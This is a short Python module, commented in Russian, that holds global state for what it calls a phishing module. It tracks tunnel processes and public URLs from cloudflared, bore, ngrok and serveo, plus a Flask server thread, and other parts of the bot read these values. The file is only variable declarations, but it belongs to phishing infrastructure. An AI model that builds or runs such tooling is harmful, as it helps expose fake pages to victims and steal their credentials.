"""
fish_bot_state.py — глобальный стейт фишинг-модуля.
Хранит tunnel_process и tunnel_url, чтобы fish_web.py и bot.py
могли читать состояние туннеля без циклических импортов.
"""
tunnel_process  = None   # cloudflared процесс (основной авто-фоллбэк)
tunnel_url      = None   # URL от cloudflared
bore_process    = None   # bore — отдельный процесс
bore_url        = None   # URL вида http://bore.pub:XXXXX
ngrok_process   = None   # ngrok — отдельный процесс
ngrok_url       = None   # URL вида https://xxxx.ngrok-free.app
serveo_process  = None   # serveo — SSH-тоннель, отдельный процесс
serveo_url      = None   # URL вида https://xxxx.serveo.net
server_thread   = None   # threading.Thread Flask-сервера
server_running  = False  # Flask жив?
last_loaded_url = None
